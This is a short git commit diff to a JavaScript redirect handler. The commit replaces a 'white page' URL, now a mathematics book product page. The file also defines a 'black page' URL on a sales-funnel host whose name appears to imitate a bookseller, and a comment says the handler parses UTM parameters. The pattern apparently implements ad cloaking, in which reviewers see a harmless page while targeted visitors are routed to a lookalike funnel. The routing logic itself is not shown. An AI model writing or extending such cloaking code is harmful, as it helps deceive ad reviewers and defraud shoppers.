3ccd9acf8d8d6082a606e7dd0fc742885af0d6dd
rmeeesumraza <github@snobay.com>
2025-05-18 18:58:00 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://de.readly.com/magazines/frau-im-spiegel/2025-05-07";
+    const whitePageURL = "https://arihantbooks.com/products/skills-in-mathematics-jee-main-advanced-algebra-revised-edition-2026";
     const blackPageURL = "https://wabebookscom.myfunnelish.com/cshhhhhn-1747502439037021";
   
     // Parse the UTM parameters from the request URL
